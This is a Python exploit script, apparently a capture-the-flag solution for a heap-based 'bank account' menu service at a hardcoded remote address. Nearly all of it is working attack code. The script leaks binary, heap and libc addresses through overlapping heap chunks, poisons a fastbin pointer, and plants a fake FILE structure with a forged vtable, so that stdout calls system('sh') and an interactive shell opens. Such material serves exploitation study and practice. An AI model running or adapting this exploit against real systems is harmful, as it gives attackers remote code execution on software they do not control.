from my_pwnlib import *

tcp_connect('185.168.131.144', 6000)

OFFSET_PRINTF = 0x4f190
OFFSET_SYSTEM = 0x3f480
OFFSET_STDOUT = 0x398600
OFFSET_SH = 0x11eb0

def create(title, size, statement):
	sendafter('5. View your bank status\n', '1\n')
	sendafter('Enter title of bank account: ', title)
	sendafter('Enter size of your bank statement: ', str(size) + '\n')
	send(statement + '\n')

def edit_title(index, title):
	sendafter('5. View your bank status\n', '2\n')
	sendafter('Enter index of bank account: ', str(index) + '\n')
	send(title)

def edit_statement(index, statement):
	sendafter('5. View your bank status\n', '3\n')
	sendafter('Enter index of bank account: ', str(index) + '\n')
	send(statement + '\n')

def delete(index):
	sendafter('5. View your bank status\n', '4\n')
	sendafter('Enter index of bank account: ', str(index) + '\n')

def show(index):
	sendafter('5. View your bank status\n', '5\n')
	sendafter('Enter index of bank account: ', str(index) + '\n')
	account = {
		'title': recvuntil('\nStatement: ').split('\nStatement: ')[0].split('Title: ')[1],
		'statement': recvuntil('\n1. Create an account').split('\n1. Create an account')[0]
	}
	return account

#leak default_balance

create('test', 0x10, '1234')
delete(0)
create('test', 0x20, '1234')
create('test', 0x10, '1234')
delete(0)
create('test', 0x20, 'A'*8 + '\x21' + '\x00'*7)
delete(0)
create('A'*0x10 + '\x31', 0x10, '1234')
delete(1)
create('test', 0x10, '1234')
create('\x31', 0x10, '1234')
create('test', 0x10, '1234')
edit_title(2, 'A'*8)

default_balance = u64(show(2)['title'].split('A'*8)[1][:6].ljust(8, '\x00'))
executeable_section = default_balance - 0x202010
accounts = executeable_section + 0x202060
printf_got = executeable_section + 0x0000000000201f88

print 'Executeable section @ ' + hex(executeable_section)

create('test', 0x10, '1234')
delete(4)
create('test', 0x20, '1234')
create('test', 0x10, '1234')
delete(4)
create('A'*0x10 + '\x81', 0x10, '1234')
create('test', 0x10, '1234')
delete(5)

payload = ''
payload += p64(0x0)*3
payload += p64(0x31)
payload += p64(default_balance)
payload += p64(0x1000)
payload += p64(accounts)

create('test', 0x68, payload)

heap = u64(show(6)['statement'][:6].ljust(8, '\x00')) - 0x10
chunk_index_6_title_addr = heap +  0x1a8

print 'Heap @ ' + hex(heap)

payload = ''
payload += p64(0x0)*2
payload += p64(0x31)
payload += p64(default_balance)
payload += p64(0x1000)
payload += p64(printf_got)

edit_title(6, payload)

libc = u64(show(5)['statement'][:6].ljust(8, '\x00')) - OFFSET_PRINTF

print 'Libc @ ' + hex(libc)

payload = ''
payload += p64(0x0)*2
payload += p64(0x31)
payload += p64(default_balance)
payload += p64(0x1000)
payload += p64(0x0)

edit_title(6, payload)

delete(5)

create('test', 0x60, '1234')

delete(5)

#overwrite free fastbin fd pointer to point to somewhere before the pointer to the stdout file struct where the size is 0x7f (libc address)

payload = ''
payload += p64(0x0)*2
payload += p64(0x31)
payload += p64(0x0)*13
payload += p64(0x71)
payload += p64(executeable_section + 0x201ff5)
payload += p64(0x0)*12
payload += p64(0x20d71)
payload += p64(0x0)*6

#fake file struct

#https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

io_str_overflow_ptr_addr = libc + 0x394518

fake_vtable_addr = io_str_overflow_ptr_addr - 0x38

rip = libc + OFFSET_SYSTEM
rdi = libc + OFFSET_SH

file_struct = pack_file(
	_IO_buf_base = 0,
	_IO_buf_end = (rdi-100)/2,
	_IO_write_ptr = (rdi-100)/2,
	_IO_write_base = 0,
	_lock = heap + 0x2d0 + 0x80)

file_struct += p64(fake_vtable_addr)
file_struct += p64(rip)
file_struct = file_struct.ljust(0x100, '\x00')

payload += file_struct

edit_title(6, payload)

#create new chunk so that our fake chunk is now at the tail of the fastbin list (fastbin list is LIFO)

create('test', 0x60, '1234')

pause()

payload = ''
payload += '\x00'*3
payload += p64(executeable_section + 0x202008)
payload += p64(0x60c0c748)
payload += p64(0x0)
payload += p64(heap + 0x2d0)

#now this chunk gets allocated so that we overwrite the pointer to the stdout file struct so that it points to our fake file struct

create('test', 0x60, payload)

print "Shell?"

telnet_interact()
